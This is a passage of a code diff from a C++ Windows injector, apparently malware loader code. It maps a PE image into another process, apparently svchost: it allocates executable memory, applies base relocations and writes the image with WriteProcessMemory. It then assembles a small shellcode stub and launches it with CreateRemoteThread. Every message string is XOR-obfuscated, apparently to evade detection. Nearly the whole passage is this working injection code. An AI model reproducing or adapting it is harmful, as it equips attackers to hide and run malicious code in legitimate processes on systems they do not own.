-MYS_ecureZeroMemory((char*)_fuckingstring,100);_fuckingstring[0]=118;_fuckingstring[1]=115;_fuckingstring[2]=104;_fuckingstring[3]=117;_fuckingstring[4]=100;_fuckingstring[5]=33;_fuckingstring[6]=113;_fuckingstring[7]=115;_fuckingstring[8]=110;_fuckingstring[9]=98;_fuckingstring[10]=100;_fuckingstring[11]=114;_fuckingstring[12]=114;_fuckingstring[13]=33;_fuckingstring[14]=108;_fuckingstring[15]=100;_fuckingstring[16]=108;_fuckingstring[17]=110;_fuckingstring[18]=115;_fuckingstring[19]=120;_fuckingstring[20]=33;_fuckingstring[21]=103;_fuckingstring[22]=96;_fuckingstring[23]=104;_fuckingstring[24]=109;_fuckingstring[25]=101;_fuckingstring[26]=33;_fuckingstring[27]=41;_fuckingstring[28]=49;_fuckingstring[29]=121;_fuckingstring[30]=36;_fuckingstring[31]=109;_fuckingstring[32]=89;_fuckingstring[33]=40;_fuckingstring[34]=11;_fuckingstring[35]=1;FBXorCrypt(_fuckingstring, 36);
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 79; _fuckingstring[9] = 110; _fuckingstring[10] = 117; _fuckingstring[11] = 33; _fuckingstring[12] = 103; _fuckingstring[13] = 110; _fuckingstring[14] = 116; _fuckingstring[15] = 111; _fuckingstring[16] = 101; _fuckingstring[17] = 33; _fuckingstring[18] = 41; _fuckingstring[19] = 49; _fuckingstring[20] = 121; _fuckingstring[21] = 36; _fuckingstring[22] = 109; _fuckingstring[23] = 89; _fuckingstring[24] = 40; _fuckingstring[25] = 11; _fuckingstring[26] = 1; FBXorCrypt(_fuckingstring, 27);
 		printf(_fuckingstring, GetLastError());
 
-		CloseHandle(hw);
-
 		return -1;
 
-	}*/
+	}
 
-	//	MessageBoxA(NULL, "OK", "OK", MB_OK);
+	void* _real_base_in_target_process = VirtualAllocEx(hw, NULL, _memeoy_size_to_be_allocated_in_target_process, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)_2_29bytes, NULL, 0, 0);
 
-if (!thread)
 
-{
+	// 	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
 
-	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 71; _fuckingstring[1] = 96; _fuckingstring[2] = 104; _fuckingstring[3] = 109; _fuckingstring[4] = 100; _fuckingstring[5] = 101; _fuckingstring[6] = 33; _fuckingstring[7] = 117; _fuckingstring[8] = 110; _fuckingstring[9] = 33; _fuckingstring[10] = 98; _fuckingstring[11] = 115; _fuckingstring[12] = 100; _fuckingstring[13] = 96; _fuckingstring[14] = 117; _fuckingstring[15] = 100; _fuckingstring[16] = 33; _fuckingstring[17] = 117; _fuckingstring[18] = 105; _fuckingstring[19] = 115; _fuckingstring[20] = 100; _fuckingstring[21] = 96; _fuckingstring[22] = 101; _fuckingstring[23] = 33; _fuckingstring[24] = 49; _fuckingstring[25] = 121; _fuckingstring[26] = 36; _fuckingstring[27] = 121; _fuckingstring[28] = 11; _fuckingstring[29] = 1; FBXorCrypt(_fuckingstring, 30);
+	uiLibraryAddress = reinterpret_cast<DWORD64>(_real_base_in_target_process) - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
+
+
+
+	// uiValueB = the address of the relocation directory
+
+	// .reloc
+
+	uiValueB = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+
+
+	// check if their are any relocations present
+
+	if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size)
+
+	{
+
+		// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
+
+		uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);
+
+
+
+		// and we itterate through all entries...
+
+		while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock)
+
+		{
+
+#ifdef jinyongyutiaoshi
+
+			MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 114; _fuckingstring[1] = 123; _fuckingstring[2] = 104; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 110; _fuckingstring[6] = 103; _fuckingstring[7] = 33; _fuckingstring[8] = 99; _fuckingstring[9] = 109; _fuckingstring[10] = 110; _fuckingstring[11] = 98; _fuckingstring[12] = 106; _fuckingstring[13] = 33; _fuckingstring[14] = 104; _fuckingstring[15] = 111; _fuckingstring[16] = 33; _fuckingstring[17] = 115; _fuckingstring[18] = 100; _fuckingstring[19] = 109; _fuckingstring[20] = 110; _fuckingstring[21] = 98; _fuckingstring[22] = 33; _fuckingstring[23] = 100; _fuckingstring[24] = 111; _fuckingstring[25] = 117; _fuckingstring[26] = 115; _fuckingstring[27] = 120; _fuckingstring[28] = 59; _fuckingstring[29] = 33; _fuckingstring[30] = 49; _fuckingstring[31] = 121; _fuckingstring[32] = 36; _fuckingstring[33] = 113; _fuckingstring[34] = 11; _fuckingstring[35] = 1; FBXorCrypt(_fuckingstring, 36);
+			printf(_fuckingstring, reinterpret_cast<BYTE*>(((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock));
+
+#endif // jinyongyutiaoshi
+
+			// uiValueA = the VA for this relocation block
+
+			uiValueA = (uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);
+
+
+
+			// uiValueB = number of entries in this relocation block
+
+			// entry
+
+			uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
+
+
+
+			// uiValueD is now the first entry in the current relocation block
+
+			// entry
+
+			DWORD64	uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);
+
+
+
+			// we itterate through all the entries in the current block...
+
+			// entry
+
+			while (uiValueB--)
+
+			{
+
+				// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
+
+				// IMAGE_REL_BASED_ABSOLUTEpadding
+
+				// we dont use a switch statement to avoid the compiler building a jump table
+
+				// which would not be very position independent!
+
+				if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64) {
+
+
+
+#ifdef jinyongyutiaoshi
+
+					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 99; _fuckingstring[1] = 96; _fuckingstring[2] = 114; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 115; _fuckingstring[6] = 100; _fuckingstring[7] = 109; _fuckingstring[8] = 110; _fuckingstring[9] = 98; _fuckingstring[10] = 33; _fuckingstring[11] = 110; _fuckingstring[12] = 103; _fuckingstring[13] = 103; _fuckingstring[14] = 114; _fuckingstring[15] = 100; _fuckingstring[16] = 117; _fuckingstring[17] = 59; _fuckingstring[18] = 33; _fuckingstring[19] = 49; _fuckingstring[20] = 121; _fuckingstring[21] = 36; _fuckingstring[22] = 113; _fuckingstring[23] = 11; _fuckingstring[24] = 1; FBXorCrypt(_fuckingstring, 25);
+					printf(_fuckingstring, reinterpret_cast<BYTE*>(((PIMAGE_RELOC)uiValueD)->offset));
+
+					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 96; _fuckingstring[1] = 103; _fuckingstring[2] = 117; _fuckingstring[3] = 100; _fuckingstring[4] = 115; _fuckingstring[5] = 33; _fuckingstring[6] = 96; _fuckingstring[7] = 101; _fuckingstring[8] = 101; _fuckingstring[9] = 33; _fuckingstring[10] = 117; _fuckingstring[11] = 110; _fuckingstring[12] = 33; _fuckingstring[13] = 115; _fuckingstring[14] = 100; _fuckingstring[15] = 109; _fuckingstring[16] = 110; _fuckingstring[17] = 98; _fuckingstring[18] = 33; _fuckingstring[19] = 99; _fuckingstring[20] = 109; _fuckingstring[21] = 110; _fuckingstring[22] = 98; _fuckingstring[23] = 106; _fuckingstring[24] = 33; _fuckingstring[25] = 99; _fuckingstring[26] = 96; _fuckingstring[27] = 114; _fuckingstring[28] = 100; _fuckingstring[29] = 59; _fuckingstring[30] = 33; _fuckingstring[31] = 49; _fuckingstring[32] = 121; _fuckingstring[33] = 36; _fuckingstring[34] = 113; _fuckingstring[35] = 11; _fuckingstring[36] = 1; FBXorCrypt(_fuckingstring, 37);
+					printf(_fuckingstring, reinterpret_cast<BYTE*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset));
+
+					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 105; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 119; _fuckingstring[13] = 96; _fuckingstring[14] = 109; _fuckingstring[15] = 116; _fuckingstring[16] = 100; _fuckingstring[17] = 33; _fuckingstring[18] = 104; _fuckingstring[19] = 111; _fuckingstring[20] = 33; _fuckingstring[21] = 104; _fuckingstring[22] = 117; _fuckingstring[23] = 45; _fuckingstring[24] = 33; _fuckingstring[25] = 69; _fuckingstring[26] = 86; _fuckingstring[27] = 78; _fuckingstring[28] = 83; _fuckingstring[29] = 69; _fuckingstring[30] = 55; _fuckingstring[31] = 53; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 113; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
+					printf(_fuckingstring, reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));
+
+#endif // jinyongyutiaoshi
+
+					// delta
+
+					* (ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
+
+#ifdef jinyongyutiaoshi
+
+					MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 105; _fuckingstring[1] = 100; _fuckingstring[2] = 115; _fuckingstring[3] = 100; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 119; _fuckingstring[13] = 96; _fuckingstring[14] = 109; _fuckingstring[15] = 116; _fuckingstring[16] = 100; _fuckingstring[17] = 33; _fuckingstring[18] = 96; _fuckingstring[19] = 103; _fuckingstring[20] = 117; _fuckingstring[21] = 100; _fuckingstring[22] = 115; _fuckingstring[23] = 33; _fuckingstring[24] = 103; _fuckingstring[25] = 104; _fuckingstring[26] = 121; _fuckingstring[27] = 100; _fuckingstring[28] = 101; _fuckingstring[29] = 33; _fuckingstring[30] = 116; _fuckingstring[31] = 113; _fuckingstring[32] = 33; _fuckingstring[33] = 45; _fuckingstring[34] = 33; _fuckingstring[35] = 69; _fuckingstring[36] = 86; _fuckingstring[37] = 78; _fuckingstring[38] = 83; _fuckingstring[39] = 69; _fuckingstring[40] = 55; _fuckingstring[41] = 53; _fuckingstring[42] = 59; _fuckingstring[43] = 33; _fuckingstring[44] = 49; _fuckingstring[45] = 121; _fuckingstring[46] = 36; _fuckingstring[47] = 113; _fuckingstring[48] = 11; _fuckingstring[49] = 1; FBXorCrypt(_fuckingstring, 50);
+					printf(_fuckingstring, reinterpret_cast<DWORD64*>(*reinterpret_cast<DWORD64*>(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset)));
+
+#endif // jinyongyutiaoshi
+
+				}
+
+				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW)
+
+					*(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
+
+
+
+				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH)
+
+					*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
+
+				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW)
+
+					*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);
+
+
+
+				// get the next entry in the current relocation block
+
+				uiValueD += sizeof(IMAGE_RELOC);
+
+			}
+
+
+
+			// get the next entry in the relocation directory
+
+			uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
+
+		}
+
+	}
+
+
+
+	// PE
+
+
+
+	if (!WriteProcessMemory(hw, _real_base_in_target_process, reinterpret_cast<VOID*>(_pe_addr_load_in_current_process), _memeoy_size_to_be_allocated_in_target_process, NULL))
+
+	{
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
+		printf(_fuckingstring, (unsigned int)GetLastError());
+
+		exit(-1);
+
+	}
+
+
+
+	//
+
+	//	uiValueA = (uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
+
+	uiValueA = (reinterpret_cast<DWORD64>(_real_base_in_target_process) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint);
+
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 117; _fuckingstring[1] = 105; _fuckingstring[2] = 104; _fuckingstring[3] = 114; _fuckingstring[4] = 33; _fuckingstring[5] = 104; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 117; _fuckingstring[9] = 105; _fuckingstring[10] = 100; _fuckingstring[11] = 33; _fuckingstring[12] = 100; _fuckingstring[13] = 111; _fuckingstring[14] = 117; _fuckingstring[15] = 115; _fuckingstring[16] = 120; _fuckingstring[17] = 33; _fuckingstring[18] = 113; _fuckingstring[19] = 110; _fuckingstring[20] = 104; _fuckingstring[21] = 111; _fuckingstring[22] = 117; _fuckingstring[23] = 33; _fuckingstring[24] = 104; _fuckingstring[25] = 111; _fuckingstring[26] = 33; _fuckingstring[27] = 117; _fuckingstring[28] = 96; _fuckingstring[29] = 115; _fuckingstring[30] = 102; _fuckingstring[31] = 100; _fuckingstring[32] = 117; _fuckingstring[33] = 33; _fuckingstring[34] = 113; _fuckingstring[35] = 115; _fuckingstring[36] = 110; _fuckingstring[37] = 98; _fuckingstring[38] = 100; _fuckingstring[39] = 114; _fuckingstring[40] = 114; _fuckingstring[41] = 59; _fuckingstring[42] = 33; _fuckingstring[43] = 49; _fuckingstring[44] = 121; _fuckingstring[45] = 36; _fuckingstring[46] = 113; _fuckingstring[47] = 11; _fuckingstring[48] = 1; FBXorCrypt(_fuckingstring, 49);
+	printf(_fuckingstring, reinterpret_cast<BYTE*>(uiValueA));
+
+
+
+	// alignrspcallalign rsp
+
+
+
+	// align rsp
+
+
+
+	void* _2_29bytes = VirtualAllocEx(hw, NULL, 29, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	BYTE _fuckyou1[12] = { 0x56,0x48,0x8B,0xF4,0x48,0x83,0xE4,0xF0,0x48,0x83,0xEC,0x20 };
+
+	if (!WriteProcessMemory(hw, _2_29bytes, _fuckyou1, 12, NULL))
+
+	{
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
+		printf(_fuckingstring, (unsigned int)GetLastError());
+
+		exit(-1);
+
+	}
+
+	// mov rax, .....
+
+	BYTE caonimadwozhendefue[2] = { 0x48,0xb8 };
+
+	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12, caonimadwozhendefue, 2, NULL))
+
+	{
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
+		printf(_fuckingstring, (unsigned int)GetLastError());
+
+		exit(-1);
+
+	}
+
+	//  8bytes
+
+	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2, &uiValueA, 8, NULL))
+
+	{
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
+		printf(_fuckingstring, (unsigned int)GetLastError());
+
+		exit(-1);
+
+	}
+
+	// call rax
+
+	BYTE _CAL_RAX[2] = { 0xFF, 0xD0 };
+
+	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8, _CAL_RAX, 2, NULL))
+
+	{
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
+		printf(_fuckingstring, (unsigned int)GetLastError());
+
+		exit(-1);
+
+	}
+
+
+
+	BYTE _CAL_RA___RET_X[5] = { 0x48, 0x8b, 0xe6, 0x5e, 0xc3 };
+
+	if (!WriteProcessMemory(hw, (BYTE*)_2_29bytes + 12 + 2 + 8 + 2, _CAL_RA___RET_X, 5, NULL))
+
+	{
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 81; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 98; _fuckingstring[4] = 100; _fuckingstring[5] = 114; _fuckingstring[6] = 114; _fuckingstring[7] = 33; _fuckingstring[8] = 118; _fuckingstring[9] = 104; _fuckingstring[10] = 115; _fuckingstring[11] = 117; _fuckingstring[12] = 100; _fuckingstring[13] = 33; _fuckingstring[14] = 103; _fuckingstring[15] = 96; _fuckingstring[16] = 104; _fuckingstring[17] = 109; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 45; _fuckingstring[21] = 33; _fuckingstring[22] = 100; _fuckingstring[23] = 115; _fuckingstring[24] = 115; _fuckingstring[25] = 110; _fuckingstring[26] = 115; _fuckingstring[27] = 33; _fuckingstring[28] = 98; _fuckingstring[29] = 110; _fuckingstring[30] = 101; _fuckingstring[31] = 100; _fuckingstring[32] = 59; _fuckingstring[33] = 33; _fuckingstring[34] = 49; _fuckingstring[35] = 121; _fuckingstring[36] = 36; _fuckingstring[37] = 121; _fuckingstring[38] = 11; _fuckingstring[39] = 1; FBXorCrypt(_fuckingstring, 40);
+		printf(_fuckingstring, (unsigned int)GetLastError());
+
+		exit(-1);
+
+	}
+
+
+
+	//   _2_29bytes
+
+	//HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, _svchost_1_pid);
+
+	//if (!hw)
+
+	//{
+
+	//	printf("Process Not found (0x%lX)\n", GetLastError());
+
+	//		return -1;
+
+		//}
+
+		/*void* base = VirtualAllocEx(hw, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+		if (!base)
+
+		{
+
+			CloseHandle(hw);
+
+			return -1;
+
+		}
+
+		if (!WriteProcessMemory(hw, base, byteArray, fileSize, NULL))
+
+		{
+
+	MYS_ecureZeroMemory((char*)_fuckingstring,100);_fuckingstring[0]=118;_fuckingstring[1]=115;_fuckingstring[2]=104;_fuckingstring[3]=117;_fuckingstring[4]=100;_fuckingstring[5]=33;_fuckingstring[6]=113;_fuckingstring[7]=115;_fuckingstring[8]=110;_fuckingstring[9]=98;_fuckingstring[10]=100;_fuckingstring[11]=114;_fuckingstring[12]=114;_fuckingstring[13]=33;_fuckingstring[14]=108;_fuckingstring[15]=100;_fuckingstring[16]=108;_fuckingstring[17]=110;_fuckingstring[18]=115;_fuckingstring[19]=120;_fuckingstring[20]=33;_fuckingstring[21]=103;_fuckingstring[22]=96;_fuckingstring[23]=104;_fuckingstring[24]=109;_fuckingstring[25]=101;_fuckingstring[26]=33;_fuckingstring[27]=41;_fuckingstring[28]=49;_fuckingstring[29]=121;_fuckingstring[30]=36;_fuckingstring[31]=109;_fuckingstring[32]=89;_fuckingstring[33]=40;_fuckingstring[34]=11;_fuckingstring[35]=1;FBXorCrypt(_fuckingstring, 36);
+			printf(_fuckingstring, GetLastError());
+
+			CloseHandle(hw);
+
+			return -1;
+
+		}*/
+
+		//	MessageBoxA(NULL, "OK", "OK", MB_OK);
+
+	HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)_2_29bytes, NULL, 0, 0);
+
+	if (!thread)
+
+	{
+
+		MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 71; _fuckingstring[1] = 96; _fuckingstring[2] = 104; _fuckingstring[3] = 109; _fuckingstring[4] = 100; _fuckingstring[5] = 101; _fuckingstring[6] = 33; _fuckingstring[7] = 117; _fuckingstring[8] = 110; _fuckingstring[9] = 33; _fuckingstring[10] = 98; _fuckingstring[11] = 115; _fuckingstring[12] = 100; _fuckingstring[13] = 96; _fuckingstring[14] = 117; _fuckingstring[15] = 100; _fuckingstring[16] = 33; _fuckingstring[17] = 117; _fuckingstring[18] = 105; _fuckingstring[19] = 115; _fuckingstring[20] = 100; _fuckingstring[21] = 96; _fuckingstring[22] = 101; _fuckingstring[23] = 33; _fuckingstring[24] = 49; _fuckingstring[25] = 121; _fuckingstring[26] = 36; _fuckingstring[27] = 121; _fuckingstring[28] = 11; _fuckingstring[29] = 1; FBXorCrypt(_fuckingstring, 30);
+		printf(_fuckingstring, (unsigned int)GetLastError());
+
+		CloseHandle(hw);
+
+		CloseHandle(thread);
+
+	}
+
+	// wait
+
+	WaitForSingleObject(thread, INFINITE);
+
+
+
+	VirtualFreeEx(hw, _real_base_in_target_process, _memeoy_size_to_be_allocated_in_target_process, MEM_DECOMMIT);
+
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 115; _fuckingstring[2] = 100; _fuckingstring[3] = 100; _fuckingstring[4] = 59; _fuckingstring[5] = 33; _fuckingstring[6] = 49; _fuckingstring[7] = 121; _fuckingstring[8] = 36; _fuckingstring[9] = 121; _fuckingstring[10] = 11; _fuckingstring[11] = 1; FBXorCrypt(_fuckingstring, 12);
 	printf(_fuckingstring, (unsigned int)GetLastError());
 
-	CloseHandle(hw);
+	VirtualFreeEx(hw, _2_29bytes, 29, MEM_DECOMMIT);
 
-	CloseHandle(thread);
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 115; _fuckingstring[2] = 100; _fuckingstring[3] = 100; _fuckingstring[4] = 59; _fuckingstring[5] = 33; _fuckingstring[6] = 49; _fuckingstring[7] = 121; _fuckingstring[8] = 36; _fuckingstring[9] = 121; _fuckingstring[10] = 11; _fuckingstring[11] = 1; FBXorCrypt(_fuckingstring, 12);
+	printf(_fuckingstring, (unsigned int)GetLastError());
 
-}
+	//printf(
 
-// wait
-
-WaitForSingleObject(thread, INFINITE);
-
-
-
-VirtualFreeEx(hw, _real_base_in_target_process, _memeoy_size_to_be_allocated_in_target_process, MEM_DECOMMIT);
-
-MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 103; _fuckingstring[1] = 115; _fuckingstring[2] = 100; _fuckingstring[3] = 100; _fuckingstring[4] = 59; _fuckingstring[5] = 33; _fuckingstring[6] = 49; _fuckingstring[7] = 121; _fuckingstring[8] = 36; _fuckingstring[9] = 121; _fuckingstring[10] = 11; _fuckingstring[11] = 1; FBXorCrypt(_fuckingstring, 12);
-printf(_fuckingstring, (unsigned int)GetLastError());
-
-VirtualFreeEx(hw, _2_29bytes, 29, MEM_DECOMMIT);
-
